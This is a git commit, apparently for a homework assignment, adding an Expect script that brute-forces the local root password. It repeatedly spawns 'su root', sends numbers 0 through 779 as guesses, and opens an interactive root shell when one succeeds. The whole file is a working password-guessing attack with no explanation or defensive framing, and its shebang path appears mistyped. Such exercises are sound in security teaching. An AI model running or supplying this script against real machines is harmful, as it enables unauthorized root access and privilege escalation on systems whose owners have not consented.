b09067448c942f10784cb819956d01ee17eb7a0f
YalingZheng <yaling.zheng@gmail.com>
2020-02-04 15:50:27 -0500

    continuously guessing a password

---
+++ HW2/GuessingPwdsUsingLoop.tcl
@@ -0,0 +1,15 @@
+#!/user/bin/expect -f
+set NUM 0
+while { $NUM < 780 } {
+  spawn su root
+  expect "Password:"
+  send_user "$NUM\n"
+  send "$NUM\n"
+  expect {
+    "su: Authentication failure*" { }
+    "*root*" {
+              interact
+              }
+   }
+   set NUM [expr $NUM + 1]
+}
